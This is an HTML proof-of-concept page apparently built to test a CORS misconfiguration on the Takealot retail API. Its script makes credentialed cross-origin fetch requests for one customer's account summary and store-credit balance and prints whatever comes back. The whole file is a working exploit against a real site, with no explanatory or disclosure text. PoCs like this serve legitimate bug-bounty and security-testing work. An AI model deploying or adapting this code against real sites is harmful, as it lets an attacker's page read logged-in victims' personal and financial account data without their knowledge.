<!DOCTYPE html>
<html>
<head>
  <title>CORS PoC</title>
</head>
<body>
<h1>CORS PoC - Takealot</h1>
<p>Fetching account data cross-origin...</p>
<pre id="output">Loading...</pre>
<pre id="cookies">Waiting...</pre>
<script>
  // Attempt 1: Fetch account summary cross-origin with credentials
  fetch("https://api.takealot.com/rest/v-1-16-0/customers/2678447/summary", {
    credentials: "include"
  })
  .then(r => {
    document.getElementById("output").innerText = "Status: " + r.status + "\n"
    return r.json()
  })
  .then(data => {
    document.getElementById("output").innerText += JSON.stringify(data, null, 2)
  })
  .catch(err => {
    document.getElementById("output").innerText = "Error: " + err
  })

  // Attempt 2: Fetch credits balance
  fetch("https://api.takealot.com/rest/v-1-16-0/customers/2678447/credits/balance", {
    credentials: "include"
  })
  .then(r => r.json())
  .then(data => {
    document.getElementById("cookies").innerText = "Credits: " + JSON.stringify(data, null, 2)
  })
  .catch(err => {
    document.getElementById("cookies").innerText = "Credits error: " + err
  })
</script>
</body>
</html>
